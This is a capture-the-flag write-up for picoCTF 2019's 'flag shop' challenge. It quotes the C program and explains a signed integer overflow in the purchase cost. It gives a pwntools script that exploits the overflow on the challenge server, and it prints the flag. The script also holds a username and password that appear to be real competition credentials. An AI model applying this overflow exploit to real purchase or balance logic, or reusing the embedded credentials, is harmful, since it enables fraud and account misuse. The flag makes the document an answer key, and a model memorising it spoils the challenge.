# Problem
There's a flag shop selling stuff, can you buy a flag? [Source](https://2019shell1.picoctf.com/static/cf15b93155d8b2361ca2fc2c61ee4d5f/store.c). Connect with nc 2019shell1.picoctf.com 60851.

## Hints:

Two's compliment can do some weird things when numbers get really big!

## Solution:

Let's download the file:
```bash
wget https://2019shell1.picoctf.com/static/cf15b93155d8b2361ca2fc2c61ee4d5f/store.c

```

Now, let's take a look:
```c
#include <stdio.h>
#include <stdlib.h>
int main()
{
    setbuf(stdout, NULL);
    int con;
    con = 0;
    int account_balance = 1100;
    while(con == 0){
        
        printf("Welcome to the flag exchange\n");
        printf("We sell flags\n");

        printf("\n1. Check Account Balance\n");
        printf("\n2. Buy Flags\n");
        printf("\n3. Exit\n");
        int menu;
        printf("\n Enter a menu selection\n");
        fflush(stdin);
        scanf("%d", &menu);
        if(menu == 1){
            printf("\n\n\n Balance: %d \n\n\n", account_balance);
        }
        else if(menu == 2){
            printf("Currently for sale\n");
            printf("1. Defintely not the flag Flag\n");
            printf("2. 1337 Flag\n");
            int auction_choice;
            fflush(stdin);
            scanf("%d", &auction_choice);
            if(auction_choice == 1){
                printf("These knockoff Flags cost 900 each, enter desired quantity\n");
                
                int number_flags = 0;
                fflush(stdin);
                scanf("%d", &number_flags);
                if(number_flags > 0){
                    int total_cost = 0;
                    total_cost = 900*number_flags;
                    printf("\nThe final cost is: %d\n", total_cost);
                    if(total_cost <= account_balance){
                        account_balance = account_balance - total_cost;
                        printf("\nYour current balance after transaction: %d\n\n", account_balance);
                    }
                    else{
                        printf("Not enough funds to complete purchase\n");
                    }
                                    
                    
                }
                    
                    
                    
                
            }
            else if(auction_choice == 2){
                printf("1337 flags cost 100000 dollars, and we only have 1 in stock\n");
                printf("Enter 1 to buy one");
                int bid = 0;
                fflush(stdin);
                scanf("%d", &bid);
                
                if(bid == 1){
                    
                    if(account_balance > 100000){
                        FILE *f = fopen("flag.txt", "r");
                        if(f == NULL){

                            printf("flag not found: please run this on the server\n");
                            exit(0);
                        }
                        char buf[64];
                        fgets(buf, 63, f);
                        printf("YOUR FLAG IS: %s\n", buf);
                        }
                    
                    else{
                        printf("\nNot enough funds for transaction\n\n\n");
                    }}

            }
        }
        else{
            con = 1;
        }

    }
    return 0;
}
```

Lets try to understand. We can see out balance, and buy fake/real flags. fake costs 900 and real costs 100000. We need the real flag.

There is a integer overflow that we can use. If we buy many ((2**31 + 100000) / 900) fake flags, the cost will become nagative and we will earn money. Then we can buy the real flag.

```python
#!/usr/bin/env python

from pwn import *


user = 'RoeeSefi'
pw = 'UTTE9CQN2idX28W'

p = remote('2019shell1.picoctf.com', 60851)

# Buy fake flags
print p.recvuntil(' Enter a menu selection\n')
p.sendline('2')
p.sendline('1')
p.sendline('{}'.format((2**31 + 100000) / 900))

# Check balance
p.sendline('1')
print p.recvuntil(' Enter a menu selection\n')

# Buy original flag
p.sendline('2')
p.sendline('2')
p.sendline('1')

# Exit
p.sendline('3')
print p.recvall()
```

Flag: picoCTF{m0n3y_bag5_34c9a5f7}
